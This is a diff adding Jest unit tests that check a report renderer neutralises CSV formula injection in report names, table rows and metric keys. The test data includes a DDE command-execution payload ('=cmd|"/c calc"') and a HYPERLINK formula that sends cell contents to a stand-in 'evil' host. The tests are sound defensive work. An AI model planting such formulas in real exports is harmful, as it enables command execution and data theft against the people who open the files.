@@ -115,6 +115,45 @@ describe('ReportRenderer.renderCsv', () => {
     };
     expect(() => ReportRenderer.renderCsv(makeReport(), executed)).not.toThrow();
   });
+
+  it('neutralizes CSV formula injection in the report name', () => {
+    const report = makeReport({ name: '=cmd|"/c calc"!A1' });
+    const buf = ReportRenderer.renderCsv(report, makeExecuted());
+    const text = buf.toString('utf-8');
+    expect(text).toContain("Report: '=cmd|");
+    expect(text).not.toMatch(/^Report: =cmd/m);
+  });
+
+  it('neutralizes CSV formula injection inside tabular row values', () => {
+    const executed: ExecutedReport = {
+      computedAt: '2026-01-01T00:00:00.000Z',
+      cacheHit: false,
+      filters: {},
+      widgets: [
+        {
+          id: 'w1',
+          meta: metaStub,
+          data: [{ rescueName: '=HYPERLINK("http://evil/?p="&A1,"click")', count: 1 }],
+        },
+      ],
+    };
+    const buf = ReportRenderer.renderCsv(makeReport(), executed);
+    const text = buf.toString('utf-8');
+    expect(text).toContain("'=HYPERLINK");
+  });
+
+  it('neutralizes CSV formula injection in metric-object keys and values', () => {
+    const executed: ExecutedReport = {
+      computedAt: '2026-01-01T00:00:00.000Z',
+      cacheHit: false,
+      filters: {},
+      widgets: [{ id: 'w1', meta: metaStub, data: { '=evilKey': '=evilValue' } }],
+    };
+    const buf = ReportRenderer.renderCsv(makeReport(), executed);
+    const text = buf.toString('utf-8');
+    expect(text).toContain("'=evilKey");
+    expect(text).toContain("'=evilValue");
+  });
 });
 
 describe('ReportRenderer.renderPdf', () => {
